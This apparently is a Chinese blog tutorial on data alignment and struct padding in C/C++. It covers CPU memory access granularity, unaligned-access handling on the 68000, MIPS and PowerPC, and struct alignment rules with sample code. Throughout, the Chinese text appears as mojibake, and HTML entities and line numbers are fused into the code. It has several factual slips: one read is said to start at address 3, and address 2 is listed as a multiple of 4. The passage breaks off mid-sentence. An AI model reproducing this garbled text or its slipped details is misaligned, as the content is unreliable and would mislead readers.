requirementï¼ˆå¯¹é½äºä¸€ä¸ªèƒ½è¢«å®ƒçš„alignmentæ•´é™¤çš„åœ°å€ä¸Šï¼Œå³adressÂ %Â alignment=0adress\\ \\% \\ alignment=0adressÂ %Â alignment=0ï¼‰ï¼Œè¿™æ˜¯ä¸€ç§ä»¥ç©ºé—´æ¢å–æ—¶é—´çš„ç­–ç•¥ã€‚ä¸¤ä¸ªobjecä¹‹é—´çš„ç©ºéš™ï¼Œç¼–è¯‘å™¨ä¼šå¡«å……ä¸€äº›æ— æ•ˆçš„å­—èŠ‚ï¼ˆpaddingï¼‰ã€‚ å‚è€ƒï¼šå­—èŠ‚å¯¹é½ä¸å¡«å……ï¼ˆData Alignment and Padding In Cï¼‰ ä¸ºä»€ä¹ˆéœ€è¦å†…å­˜å¯¹é½ï¼Ÿ éå¯¹é½çš„å†…å­˜è®¿é—®ï¼ˆunaligned memory accessï¼‰ï¼Œå…¶å½±å“å› å¤„ç†å™¨ä½“ç³»ç»“æ„è€Œå¼‚ã€‚ ä¸€äº›å¤„ç†å™¨æ ¹æœ¬å°±ä¸æ”¯æŒéå¯¹é½çš„å†…å­˜è®¿é—®ï¼Œä¸€æ—¦è®¿é—®å°±æŠ›å‡ºå¼‚å¸¸ å¢åŠ å¯¹éå¯¹é½åœ°å€è®¿é—®çš„èƒ½åŠ›ï¼Œä¼šå¢åŠ ç”µè·¯å¤æ‚æ€§ã€‚å¢åŠ budgetã€‚è¿™äº›ç”µè·¯è®¾è®¡åŸæœ¬å¯ä»¥ç”¨äºå¤„ç†æ›´å¤šçš„æ•°æ®æˆ–è®¾è®¡ä¸ºå…¶ä»–åŠŸèƒ½ã€‚ ä¸€äº›å¤„ç†å™¨èƒ½å¤„ç†éå¯¹é½å†…å­˜è®¿é—®çš„æƒ…å†µï¼Œä½†è¿™éœ€è¦é¢å¤–çš„è®¿å­˜æ¬¡æ•°ï¼Œä¼šä½¿æ€§èƒ½ä¸‹é™ ä¸€äº›å¤„ç†å™¨æ”¯æŒéå¯¹é½å†…å­˜è®¿é—®ï¼Œè€Œä¸”æ²¡æœ‰æ˜æ˜¾çš„æ€§èƒ½æŸå¤± ä¸€èˆ¬è€Œè¨€ï¼Œæ•°æ®å¯¹é½çš„ç›®çš„ï¼Œæ˜¯ä¸ºäº†å‡å°‘cpuè®¿å­˜æ¬¡æ•°ï¼Œæé«˜ç³»ç»Ÿæ€§èƒ½ã€‚æ¯”å¦‚32ä½çš„Intelå¤„ç†å™¨é€šè¿‡æ€»çº¿è®¿é—®(åŒ…æ‹¬è¯»å’Œå†™)å†…å­˜æ•°æ®ã€‚æ¯ä¸ªæ€»çº¿å‘¨æœŸä»å¶åœ°å€å¼€å§‹è®¿é—®32ä½å†…å­˜æ•°æ®ï¼Œå†…å­˜æ•°æ®ä»¥å­—èŠ‚ä¸ºå•ä½å­˜æ”¾ã€‚å¦‚æœä¸€ä¸ª32ä½çš„æ•°æ®æ²¡æœ‰å­˜æ”¾åœ¨4å­—èŠ‚æ•´é™¤çš„å†…å­˜åœ°å€å¤„ï¼Œé‚£ä¹ˆå¤„ç†å™¨å°±éœ€è¦2ä¸ªæ€»çº¿å‘¨æœŸå¯¹å…¶è¿›è¡Œè®¿é—®ï¼Œæ˜¾ç„¶è®¿é—®æ•ˆç‡ä¸‹é™å¾ˆå¤šã€‚ å†…å­˜çš„è®¾è®¡ç‰¹æ€§å¤§æ¦‚çœ‹ä¸€ä¸‹å°±å¥½äº†ï¼Œæ·±å…¥ä¸‹å»è¦äº†è§£å†…å­˜çš„ç¡¬ä»¶ç»„æˆå†…å­˜ä¸ºä»€ä¹ˆè¦å­—èŠ‚å¯¹é½ï¼Ÿ - çŸ¥ä¹å†…å­˜è¯»å†™æ˜¯å¹¶è¡Œçš„ï¼Œè€Œä¸æ˜¯ä¸²è¡Œçš„ã€‚è¿™é‡Œå…ˆæä¸€ä¸‹è®¿é—®ä¸€å—å†…å­˜å…·ä½“çš„è¿‡ç¨‹ï¼Œå‡å¦‚æˆ‘å»è®¿é—®[00~31]32bitå¤§å°å†…å­˜ï¼Œæ„å‘³ç€éœ€è¦åœ¨å†…å­˜æ¡ä¸Šæ‰¾32ä¸ªå­˜å‚¨å•å…ƒï¼Œæ‰¾32ä¸ªbitå†…å­˜ï¼Œé‚£æ•´ä¸ªè¿‡ç¨‹æ˜¯ä¾æ¬¡ä¸²è¡Œå»æ‰¾çš„å—ï¼Ÿå…ˆæ‰¾ç¬¬ä¸€ä¸ªï¼Œç„¶åæ‰¾ç¬¬äºŒä¸ªï¼Œâ€¦ï¼Œç›´åˆ°æ‰¾åˆ°32ä¸ªï¼Ÿå¦‚æœå»è®¿é—®64bitçš„è¯é‚£å°±è¦ä¸²è¡Œæ”¶é›†64æ¬¡ï¼ä¸²è¡Œæ‰¾å¤ªæ…¢äº†ï¼ï¼å®é™…ä¸Šï¼Œå†…å­˜è¯»å†™æ˜¯å¹¶è¡Œçš„æ‹¿å‡ºä½ çš„å†…å­˜æ¡ï¼Œä½ ä¼šå‘ç°å†…å­˜æ¡ä¸Šæœ‰å­˜å‚¨èŠ¯ç‰‡é¢—ç²’ï¼Œæˆ–ä¸º8ä¸ªï¼Œæˆ–ä¸º16ä¸ªæˆ–4ä¸ªã€‚ä¸€èˆ¬å•ä¸ªé¢—ç²’ç§°ä¸ºä¸€ä¸ªchipï¼Œè€Œä¸€ä¸ªchipæœ‰å¤šä¸ªbankï¼Œæ¯”å¦‚8ä¸ªï¼Œcpuä¼šæŠŠæ‰€æœ‰åœ¨çº¿çš„å†…å­˜ï¼Œæ¯ä¸€ä¸ªé¢—ç²’éƒ½é€‰å–ä¸€æ ·æ•°ç›®çš„bitï¼Œé›†åˆæˆä¸€ä¸ªcpuä½å®½ï¼Œæ¯”å¦‚64bitï¼Œå¯èƒ½ç”±ä½ å†…å­˜æ¡ä¸Š8ä¸ªé¢—ç²’æ¯ä¸€ä¸ªéƒ½æä¾›8bitã€‚æ‰€ä»¥ï¼Œåœ¨ [00~63] æˆ– [63~127]ï¼Œè¿™æ ·å•ä¸ªæˆä¸ºcpuä½å®½çš„æˆä¸ºå•æ¬¡è¯»å†™è®¿é—®çš„æ•°æ®ï¼Œå°±æ˜¯æŒ‰64ä½å¯¹é½çš„ï¼æ— æ³•æ›´æ”¹ï¼è®¿é—®æŸå¯¹é½åœ°å€ä¸Š64ä¸ªbitï¼Œå¯èƒ½ç”±8ä¸ªå†…å­˜chipï¼Œæ¯ä¸€ä¸ªchipçš„8ä¸ªbankå„è‡ªæä¾›ä¸€ä¸ªbitï¼Œåœ¨åŒä¸€æ—¶é—´å¿«é€Ÿå°±é›†é½64bitï¼å¹¶è¡Œè¿™ç§æ€ç»´åœ¨icé‡Œæ˜¯å¾ˆå¸¸è§çš„ã€‚æ‰€ä»¥å†…å­˜çš„è®¾è®¡ç‰¹æ€§å†³å®šäº†ï¼Œéœ€è¦è¿›è¡Œå†…å­˜å¯¹é½ã€‚cacheå‘½ä¸­å®é™…ä¸Šï¼Œcpuå–æ•°æ®ï¼Œä¼šå…ˆåˆ°cacheä¸­è¯»å–ï¼Œå¦‚æœmissï¼Œæ‰ä»å†…å­˜è¯»å–ã€‚å¦‚æœä¸å¯¹é½ï¼Œä¸€å°å—cache lineæ²¡æ³•å°†éœ€è¦çš„æ•°å­˜è¿›å»ï¼Œåˆæµªè´¹äº†cacheæ‹“å±•é˜…è¯»ï¼šä¸åŒå†…å­˜è®¿é—®ç²’åº¦çš„æƒ…å†µä¸‹ï¼ŒCPUæ˜¯å¦‚ä½•è®¿é—®çš„å‚è€ƒï¼šData alignment: Straighten up and fly rightProcessor's memory access granularityæœ¬å°èŠ‚èƒ½å›ç­”ä»¥ä¸‹ç–‘é—®ï¼šå¦‚æœæˆ‘å°†ä¸€ä¸ªintç±»å‹å˜é‡çš„èµ·å§‹åœ°å€æ”¾åœ¨åœ°å€1å¤„ï¼ˆå¥‡æ•°åœ°å€ï¼Œæ²¡æœ‰å¯¹é½ï¼‰ï¼Œç„¶åè®©CPUä»åœ°å€1å¼€å§‹è¯»å–ï¼Œä¸ä¹Ÿå°±èƒ½é€šè¿‡ä¸€æ¬¡è®¿é—®å°±è¯»å–åˆ°äº†æ•°æ®å—ï¼Ÿå†…å­˜ä»¥byteä½œä¸ºåŸºæœ¬å•å…ƒï¼Œè¿™è®©ç¨‹åºå‘˜ä¹ æƒ¯æ€§åœ°è®¤ä¸ºä¸åŒç±»å‹çš„æ•°æ®å¯ä»¥éšæ„å­˜å‚¨åœ¨å†…å­˜çš„ä»»æ„åœ°å€ä¸Šï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œä½†äº‹å®å¹¶éå¦‚æ­¤ã€‚è¿™æ˜¯å› ä¸ºcpuçš„ç¡¬ä»¶åŸå› ï¼Œcpuè®¿é—®å†…å­˜ä¸æ˜¯ä»¥å­—èŠ‚å—ï¼ˆchunksï¼‰ä¸ºå¤§å°ä½œä¸ºå•ä½è¿›è¡Œè®¿é—®ï¼Œè€Œæ˜¯ä»¥2ã€4ã€8ã€16ç”šè‡³32å­—èŠ‚ä¸ºå•ä½è®¿é—®å†…å­˜ã€‚è¿™ä¸ªå¤§å°ç§°ä¸ºå†…å­˜è®¿é—®ç²’åº¦ï¼ˆmemory access granularityï¼‰ã€‚åœ¨cpuæ­¤ç¡¬ä»¶ç‰¹æ€§ä¸Šï¼Œå‡è®¾ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶ä¸ä½œæ•°æ®å¯¹é½çš„å·¥ä½œï¼Œè€Œå…è®¸æ•°æ®ä»»æ„å­˜æ”¾ã€‚æˆ‘ä»¬åšè¿™ä¹ˆä¸€ä¸ªå®éªŒï¼šå‚¨å­˜æ–¹å¼1ï¼šå‡è®¾ä¸€ä¸ª4å­—èŠ‚çš„æ•°æ®å­˜å‚¨åœ¨èµ·å§‹åœ°å€0ä¸Šå‚¨å­˜æ–¹å¼2ï¼šå‡è®¾ä¸€ä¸ª4å­—èŠ‚çš„æ•°æ®å­˜å‚¨åœ¨èµ·å§‹åœ°å€1ä¸Šåœ¨ä¸åŒçš„å†…å­˜è®¿é—®ç²’åº¦ï¼ˆmemory access granularityï¼‰ä¸‹ï¼Œè§‚å¯Ÿåˆ†åˆ«ä»åœ°å€0å’Œåœ°å€1è¯»å–4å­—èŠ‚åˆ°å¯„å­˜å™¨ä¸­æ‰€éœ€è¦çš„å†…å­˜è®¿é—®æ¬¡æ•°ä»¥åŠè€—è´¹æ—¶é—´ã€‚Single-byte memory access granularityDouble-byte memory access granularityQuad-byte memory access granularityä»åœ°å€0å¼€å§‹ä¾æ¬¡è¯»å–4å­—èŠ‚åˆ°å¯„å­˜å™¨ä¸­ä»åœ°å€1å¼€å§‹ä¾æ¬¡è¯»å–4å­—èŠ‚åˆ°å¯„å­˜å™¨ä¸­Single-byte memory access granularityå½“å†…å­˜è®¿é—®ç²’åº¦ä¸º1å­—èŠ‚æ—¶ï¼Œcpuä»å†…å­˜è¯»å–æ•°æ®çš„è¡Œä¸ºå¦‚ä¸‹ï¼šå‚¨å­˜æ–¹å¼1ï¼šä¾æ¬¡è¯»å–åœ°å€0ï¼Œåœ°å€1ï¼Œåœ°å€2ï¼Œåœ°å€3çš„æ•°æ®ã€‚å‚¨å­˜æ–¹å¼2ï¼šä¾æ¬¡è¯»å–åœ°å€1ï¼Œåœ°å€2ï¼Œåœ°å€3ï¼Œåœ°å€4çš„æ•°æ®ã€‚åœ¨è¯¥å†…å­˜è®¿é—®ç²’åº¦ä¸‹ï¼Œæ— è®ºæ•°æ®æ˜¯ä»¥å‚¨å­˜æ–¹å¼1è¿˜æ˜¯å‚¨å­˜æ–¹å¼2å­˜å‚¨ï¼Œcpuè®¿é—®å†…å­˜çš„æ¬¡æ•°ä¸€æ ·ã€‚Double-byte memory access granularityå½“å†…å­˜è®¿é—®ç²’åº¦ä¸º2å­—èŠ‚æ—¶ï¼Œä»å†…å­˜è¯»å–æ•°æ®çš„è¡Œä¸ºå¦‚ä¸‹ï¼šå‚¨å­˜æ–¹å¼1ï¼šä»åœ°å€0å¼€å§‹è¯»å–2å­—èŠ‚æ•°æ®-&gt;ä»åœ°å€2å¼€å§‹è¯»å–2å­—èŠ‚æ•°æ®å‚¨å­˜æ–¹å¼2ï¼šä»åœ°å€0å¼€å§‹è¯»å–2å­—èŠ‚æ•°æ®-&gt;ä»åœ°å€2å¼€å§‹è¯»å–2å­—èŠ‚æ•°æ®-&gt;ä»åœ°å€3å¼€å§‹è¯»å–2å­—èŠ‚æ•°æ®ï¼Œä¸¢å¼ƒåœ°å€0å’Œåœ°å€5çš„æ•°æ®ï¼Œæ‹¼æ¥åœ°å€1åˆ°åœ°å€4ä¸€å…±4å­—èŠ‚æ•°æ®åˆ°å¯„å­˜å™¨ä¸­ã€‚âš ï¸åœ¨è¯¥å†…å­˜è®¿é—®ç²’åº¦ä¸‹ï¼Œcpuåªä¼šä»èƒ½è¢«2æ•´é™¤çš„åœ°å€å¼€å§‹è¯»å–ï¼Œæ¯”å¦‚ä»åœ°å€0å¼€å§‹è¯»å–ï¼Œä»åœ°å€2å¼€å§‹è¯»å–â€¦ï¼Œä»åœ°å€2nå¼€å§‹è¯»å–â€¦ã€‚å¯¹äºå‚¨å­˜æ–¹å¼1ï¼Œå†…å­˜è®¿é—®ç²’åº¦ä¸º2å­—èŠ‚ä¼šæ¯”å†…å­˜è®¿é—®ç²’åº¦ä¸º1å­—èŠ‚å°‘ä¸€åŠçš„å†…å­˜è®¿é—®æ¬¡æ•°ã€‚å› ä¸ºæ¯æ¬¡å†…å­˜è®¿é—®ä¼šäº§ç”Ÿå›ºå®šçš„å¼€é”€ï¼Œå‡å°‘äº†æ¬¡æ•°å°±æ˜¯æé«˜äº†æ€§èƒ½ã€‚ç„¶è€Œï¼Œå¯¹äºå‚¨å­˜æ–¹å¼2ï¼Œç”±äºè¿™4å­—èŠ‚æ•°æ®ä¸èƒ½å¾ˆå¥½åœ°è½åœ¨cpuçš„è®¿é—®è¾¹ç•Œä¸Šï¼Œcpuä½œäº†é¢å¤–çš„è®¿é—®æ¬¡æ•°ã€‚Quad-byte memory access granularityå½“å†…å­˜è®¿é—®ç²’åº¦ä¸º4å­—èŠ‚æ—¶ï¼Œä»å†…å­˜è¯»å–æ•°æ®çš„è¡Œä¸ºå¦‚ä¸‹ï¼šå‚¨å­˜æ–¹å¼1ï¼šä»åœ°å€0å¼€å§‹è¯»å–4å­—èŠ‚æ•°æ®ã€‚å‚¨å­˜æ–¹å¼2ï¼šä»åœ°å€0å¼€å§‹è¯»å–4å­—èŠ‚æ•°æ®-&gt;ä»åœ°å€4å¼€å§‹è¯»å–4å­—èŠ‚æ•°æ®ï¼Œä¸¢å¼ƒåœ°å€0å’Œåœ°å€5ã€6ã€7çš„æ•°æ®ï¼Œæ‹¼æ¥åœ°å€1åˆ°åœ°å€4ä¸€å…±4å­—èŠ‚æ•°æ®åˆ°å¯„å­˜å™¨ä¸­ã€‚âš ï¸åœ¨è¯¥å†…å­˜è®¿é—®ç²’åº¦ä¸‹ï¼Œcpuåªä¼šä»èƒ½è¢«4æ•´é™¤çš„åœ°å€å¼€å§‹è¯»å–ï¼Œæ¯”å¦‚ä»åœ°å€0å¼€å§‹è¯»å–ï¼Œä»åœ°å€2å¼€å§‹è¯»å–â€¦ï¼Œä»åœ°å€4nå¼€å§‹è¯»å–â€¦ã€‚åœ¨è¯¥å†…å­˜è®¿é—®ç²’åº¦ä¸‹ï¼Œå‚¨å­˜æ–¹å¼2ä»æ¯”å­˜å‚¨æ–¹å¼1å¤šäº†é¢å¤–çš„å†…å­˜è®¿é—®æ¬¡æ•°ã€‚ç»¼ä¸Šï¼Œç†è®ºä¸Šï¼Œå¢å¤§cpuæ¯æ¬¡çš„å†…å­˜è®¿é—®ç²’åº¦ï¼Œå°±å¯ä»¥å‡å°‘è®¿é—®æ¬¡æ•°ï¼Œä¹Ÿå°±æé«˜äº†æ€§èƒ½ã€‚ä½†å¦‚æœä¸å¯¹æ•°æ®å­˜æ”¾çš„åœ°å€è¿›è¡Œå¯¹é½ï¼Œè¿˜éšæ„å­˜åœ¨éå¯¹é½åœ°å€ä¸Šï¼Œå¢å¤§çš„å†…å­˜è®¿é—®ç²’åº¦è¿™ä¸€ç‰¹ç‚¹åè€Œä¼šå˜æˆçŸ­æ¿ï¼Œé€šè¿‡å¢åŠ å†…å­˜è®¿é—®ç²’åº¦å¸¦æ¥çš„æ€§èƒ½æå‡ä¼šè¢«æŠµæ¶ˆç”šè‡³å˜æˆåŠ£åŠ¿ã€‚how processors handle unaligned memory acessåœ¨å‰é¢çš„å®éªŒä¸­ï¼Œåƒåœ°å€1è¿™æ ·çš„åœ°å€å°±è¢«ç§°ä¸ºéå¯¹é½åœ°å€ï¼ˆunaligned addressï¼‰ã€‚A processor has to perform some tricks when instructed to access an unaligned address.å›åˆ°å†…å­˜è®¿é—®ç²’åº¦ä¸º4å­—èŠ‚çš„å®éªŒä¸­ï¼Œå½“cpuè®¿é—®åœ°å€1æ—¶ï¼Œé‡‡å–çš„trickså¦‚ä¸‹ï¼šThe processor needs to read the first chunk of the unaligned address and shift out the â€œunwantedâ€ bytes from the first chunk. Then it needs to read the second chunk of the unaligned address and shift out some of its information. Finally, the two are merged together for placement in the register. Itâ€™s a lot of work.ä½†æ˜¯ï¼Œè¦çŸ¥é“ï¼Œä¸€äº›å¤„ç†å™¨æ˜¯æ— æ³•å¤„ç†è®¿é—®éçº¿æ€§åœ°å€çš„æƒ…å†µï¼æ¯”å¦‚ï¼Œoriginal 68000å¤„ç†å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªå†…å­˜è®¿é—®ç²’åº¦ä¸º2çš„å¤„ç†å™¨ï¼Œå½“å®ƒè®¿é—®éå¯¹é½åœ°å€æ—¶ï¼Œç”±äºç¼ºå°‘å¤„ç†è¿™ç§æƒ…å†µä¸‹çš„ç”µè·¯ï¼Œä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œå¦‚æœæ˜¯Mac OSç³»ç»Ÿï¼Œä¼šè®©ç”¨æˆ·é‡å¯æœºå™¨ã€‚åé¢æ–°å‡ºçš„680x0ç³»åˆ—å¤„ç†å™¨ï¼Œæ¯”å¦‚68020ï¼Œå°±è§£é™¤äº†è¿™ç§é™åˆ¶ï¼Œä½¿å¾—å¤„ç†å™¨èƒ½å¤Ÿå¤„ç†è®¿é—®éå¯¹é½åœ°å€çš„æƒ…å†µã€‚ä½†ä¸ºäº†èƒ½å¤„ç†éå¯¹é½åœ°å€ï¼Œéœ€è¦å¢åŠ å¤„ç†å™¨çš„æ™¶ä½“ç®¡ï¼ˆtransistorsï¼‰æ•°é‡ï¼Œè¿™ä¼šå¢åŠ æˆæœ¬ï¼ˆtransistor budgetï¼‰ï¼Œè€Œè¿™äº›é¢„ç®—æœ¬æ¥å¯ä»¥ç”¨æ¥åŠ å¿«å¤„ç†å™¨å…¶ä»–éƒ¨åˆ†çš„å·¥ä½œé€Ÿåº¦æˆ–æ–°å¢å…¶ä»–åŠŸèƒ½ã€‚ MIPSå¤„ç†å™¨ç›´æ¥å°±ä¸æ”¯æŒéå¯¹é½å†…å­˜åœ°å€çš„è®¿é—®ï¼ŒæŠŠè¿™äº›é¢„ç®—æŠ•å…¥åˆ°å¤„ç†é€Ÿåº¦ä¸Šã€‚PowerPCç”¨çš„æ˜¯æ··åˆæ–¹æ³•ï¼Œä¸ºéå¯¹é½çš„32ä½æ•´æ•°æä¾›ç¡¬ä»¶æ”¯æŒã€‚è™½ç„¶è®¿é—®éå¯¹é½ä»ä¼šå¯¹æ€§èƒ½é€ æˆå½±å“ï¼Œä½†è¿™ç§å½±å“è¢«é™ä½äº†å¾ˆå¤šã€‚ä½†å¦ä¸€æ–¹é¢ï¼Œç°ä»£PowerPCå¤„ç†å™¨ç¼ºä¹å¯¹æœªå¯¹é½64ä½æµ®ç‚¹æ•°è®¿é—®çš„ç¡¬ä»¶æ”¯æŒã€‚å½“è¦æ±‚ä»å†…å­˜ä¸­åŠ è½½æœªå¯¹é½çš„æµ®ç‚¹æ•°æ—¶ï¼Œç°ä»£PowerPCå¤„ç†å™¨ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè®©æ“ä½œç³»ç»Ÿåœ¨è½¯ä»¶ä¸­æ‰§è¡Œå¯¹é½å·¥ä½œï¼Œåœ¨è½¯ä»¶ä¸­æ‰§è¡Œå¯¹é½ä¼šæ¯”åœ¨ç¡¬ä»¶ä¸­æ‰§è¡Œæ…¢å¾—å¤šã€‚ å¯¹é½è§„åˆ™ è§„åˆ™ä¸€ï¼šå†…ç½®ç±»å‹çš„å¯¹é½å€¼ åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ˆå³ä¸æŒ‡å®šå¯¹é½è¦æ±‚ï¼‰ï¼Œå¯¹äºå†…ç½®ç±»å‹ï¼Œæ¯”å¦‚charï¼Œshortï¼Œintï¼ŒæŒ‡é’ˆç­‰ç­‰ï¼Œå…¶å¯¹é½å€¼=ï¼ˆsizeofçš„ç»“æœï¼‰ï¼Œåˆç§°è‡ªç„¶å¯¹é½ã€‚ ä¸€ä¸ªå†…ç½®ç±»å‹å˜é‡çš„å®½åº¦ä¸ºnä¸ªå­—èŠ‚ï¼Œåˆ™è¯¥å˜é‡çš„èµ·å§‹åœ°å€æ˜¯nçš„æ•´æ•°å€ã€‚å³å­˜æ”¾èµ·å§‹åœ°å€%n=0ã€‚This applies independently of whether the object is inside a collection, such as a struct or array, or not. Type Size Address restriction char 1 No restriction short 2 Multiple of 2 int 4 Multiple of 4 long int 4 Multiple of 4 __int64 8 Multiple of 8 float 4 Multiple of 4 double 8 Multiple of 8 12345678910111213141516171819202122232425//åç¼€ä¸º.cæ–‡ä»¶ï¼Œ.cppå…¨å±€å˜é‡ä»é«˜åœ°å€åˆ°ä½åœ°å€åˆ†é…ï¼Œæ²¡ç»†ç©¶#include &lt;stdio.h&gt;char a;short b;int c;long d;__int64 e;float f;double g;int main(int argc, char *argv[])&#123; a=1; b=2; c=3; d=4; e=5; f=6; g=7; return 0;&#125; åº”è¯¥æ˜¯ç¼–è¯‘å™¨ä¼˜åŒ–äº†å˜é‡çš„åœ°å€å¸ƒå±€ï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æ³•çœ‹å‡ºpaddingã€‚ç®—äº†ï¼Œç”¨è¿™ä¸ªä¾‹å­å¯ä»¥çœ‹å‡ºå˜é‡çš„èµ·å§‹åœ°å€éƒ½æ˜¯å˜é‡å®½åº¦çš„æ•´æ•°å€ï¼Œæ˜¯å¯¹é½çš„ã€‚ è§„åˆ™äºŒï¼šç»“æ„ä½“æˆ–ç±»çš„å¯¹é½å€¼ ç»“æ„ä½“å˜é‡çš„èµ·å§‹åœ°å€æ˜¯æ‰€æœ‰æˆå‘˜ä¸­æœ€å®½çš„æ•°æ®ç±»å‹çš„æ•´æ•°å€ã€‚å‡è®¾ä¸€ä¸ªç»“æ„ä½“æœ‰æˆå‘˜1ï¼Œæˆå‘˜2â€¦ï¼Œåˆ™è¯¥ç»“æ„ä½“å˜é‡çš„å­˜æ”¾èµ·å§‹åœ°å€%max&#123;æˆå‘˜1çš„å®½åº¦ï¼Œæˆå‘˜2çš„å®½åº¦ï¼Œ...&#125;=0ã€‚ æœ‰æ•°ç»„çš„è¯ï¼Œæ˜¯çœ‹æ•°ç»„çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ•°ç»„çš„é•¿åº¦ã€‚å¾ˆå¥½è®°ï¼Œå‡å¦‚ç»“æ„ä½“æœ‰char [7]æˆå‘˜ï¼Œä¸å¯èƒ½æŒ‰7å¯¹é½å§ã€‚ å¦‚æœä¸€ä¸ªç»“æ„é‡Œæœ‰ç»“æ„ä½“æˆå‘˜ï¼Œåˆ™è¯¥ç»“æ„ä½“æˆå‘˜çš„å¯¹é½å€¼ä¸ºå†…éƒ¨æœ€å®½æ•°æ®ç±»å‹çš„å®½åº¦ã€‚ 1234567891011121314151617struct B&#123; char a; int b; double c; //æœ€å®½çš„æ•°æ®ç±»å‹&#125;;struct A&#123; short c; struct B d; //è¿™ä¸ªæˆå‘˜ä»¥8å­—èŠ‚è¿›è¡Œå¯¹é½ int e;&#125;;//è¿˜ä¼šå½±å“åˆ°çš„ï¼š//ç»“æ„ä½“Açš„æ•´ä¸ªå¤§å°è¦æ˜¯8çš„å€æ•°ï¼Œå› ä¸ºæœ€å®½çš„æˆå‘˜ä¸ºBï¼Œæ˜¯8//è¿™æ˜¯åé¢è§„åˆ™ä¸‰çš„å†…å®¹ .cæ–‡ä»¶ä¸‹ä¸å…è®¸å£°æ˜ç©ºç»“æ„ä½“ï¼Œ.cppæ–‡ä»¶å¯ä»¥å£°æ˜ç©ºç»“æ„ä½“å’Œç©ºç±»ï¼Œç©ºç»“æ„ä½“å’Œç©ºç±»å¤§å°ä¸º1ã€‚ 123456789struct A&#123;&#125;;class B&#123; &#125;; 12345678910111213141516171819202122232425#include &quot;stdafx.h&quot;struct Test_1&#123; char a; int b;&#125;v_1;struct Test_2&#123; char a; __int64 b;&#125;v_2;int main(int argc, char *argv[])&#123; v_1.a=1; v_1.b=2; v_2.a=3; v_2.b=4; return 0;&#125; ä¸Šè¿°ä¾‹å­å¯ä»¥çœ‹å‡ºç»“æ„ä½“å˜é‡çš„èµ·å§‹åœ°å€æ˜¯æ‰€æœ‰æˆå‘˜ä¸­æœ€å®½çš„æ•°æ®ç±»å‹çš„æ•´æ•°å€ã€‚Test_1ç»“æ„ä½“å˜é‡çš„å¯¹é½å€¼æ˜¯4ï¼ŒTest_2ç»“æ„ä½“å˜é‡çš„å¯¹é½å€¼æ˜¯8ã€‚ å¦å¤–ï¼Œåœ¨ç»“æ„ä½“ä¸­çš„å˜é‡ä¹Ÿéµå®ˆè§„åˆ™ä¸€ï¼Œå³ç»“æ„ä½“ä¸­å„ä¸ªå˜é‡çš„èµ·å§‹åœ°å€ä¹Ÿè¦å¯¹é½è‡ªèº«çš„æ•°æ®ç±»å‹ã€‚ 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;struct Test&#123; char a; int b;&#125;v_1;struct Test2&#123; char a; __int64 b;&#125;v_2;int main(int argc, char *argv[])&#123; v_1.a=1; v_1.b=2; v_2.a=3; v_2.b=4; printf(&quot;%-30s%-10s%-20s%-10s &quot;, &quot;ç»“æ„ä½“æˆå‘˜çš„æ•°æ®ç±»å‹&quot;, &quot;size&quot;, &quot;æˆå‘˜èµ·å§‹address&quot;, &quot;æˆå‘˜èµ·å§‹åœ°å€èƒ½å¦è¢«sizeæ•´é™¤&quot;); printf(&quot;%-30s%-10lu%-20p%-10s &quot;, &quot;char&quot;, sizeof(v_1.a), &amp;(v_1.a), ((size_t)&amp;(v_1.a) % sizeof(v_1.a)) == 0 ? &quot;èƒ½&quot; : &quot;ä¸èƒ½&quot;); printf(&quot;%-30s%-10lu%-20p%-10s &quot;, &quot;int&quot;, sizeof(v_1.b), &amp;(v_1.b), ((size_t)&amp;(v_1.b) % sizeof(v_1.b)) == 0 ? &quot;èƒ½&quot; : &quot;ä¸èƒ½&quot;); printf(&quot; &quot;); printf(&quot;%-30s%-10lu%-20p%-10s &quot;, &quot;char&quot;, sizeof(v_2.a), &amp;(v_2.a), ((size_t)&amp;(v_2.a) % sizeof(v_2.a)) == 0 ? &quot;èƒ½&quot; : &quot;ä¸èƒ½&quot;); printf(&quot;%-30s%-10lu%-20p%-10s &quot;, &quot;__int64&quot;, sizeof(v_2.b), &amp;(v_2.b), ((size_t)&amp;(v_2.b) % sizeof(v_2.b)) == 0 ? &quot;èƒ½&quot; : &quot;ä¸èƒ½&quot;); return 0;&#125; çœ‹Testç»“æ„ä½“ï¼Œcharç±»å‹ä»00427E30å¼€å§‹ï¼Œå 1ä¸ªå­—èŠ‚ã€‚ç„¶åç¼–è¯‘å™¨è€ƒè™‘æ”¾intç±»å‹çš„æˆå‘˜ï¼Œä½†æ­¤æ—¶00427E31è¿™ä¸ªåœ°å€ä¸èƒ½%4=0ï¼Œäºæ˜¯å¡«å……3ä¸ªå­—èŠ‚ï¼Œç›´åˆ°00427E34å¤„ï¼Œæ”¾ç½®intç±»å‹çš„æˆå‘˜ã€‚ Test2ç»“æ„ä½“åŒç†ã€‚ è§„åˆ™ä¸‰ï¼šæ•´ä¸ªç»“æ„ä½“çš„å¤§å° æ•´ä¸ªç»“æ„ä½“çš„å¤§å°éœ€è¦æ˜¯å†…éƒ¨æˆå‘˜ä¸­æœ€å®½çš„æ•°æ®ç±»å‹çš„æ•´æ•°å€ï¼Œå³sizeofï¼ˆç»“æ„ä½“ï¼‰%max&#123;æˆå‘˜1çš„å®½åº¦ï¼Œæˆå‘˜2çš„å®½åº¦ï¼Œ...&#125;=0ã€‚ æœ‰æ•°ç»„çš„è¯ï¼Œæ˜¯çœ‹æ•°ç»„çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ•°ç»„çš„é•¿åº¦ã€‚å¾ˆå¥½è®°ï¼Œå‡å¦‚ç»“æ„ä½“æœ‰char [7]æˆå‘˜ï¼Œä¸å¯èƒ½æŒ‰7å¯¹é½å§ã€‚ æœ‰å¦‚ä¸‹ç»“æ„ä½“ï¼ŒæŒ‰ç…§æˆ‘ä»¬ä¸Šé¢è®²è¿°çš„è§„åˆ™ä¸€å’Œè§„åˆ™äºŒæ¥åˆ†æï¼Œåªèƒ½åˆ†æå‡ºè¯¥ç»“æ„ä½“å 9ä¸ªå­—èŠ‚ï¼Œä½†å®é™…ä¸Šå 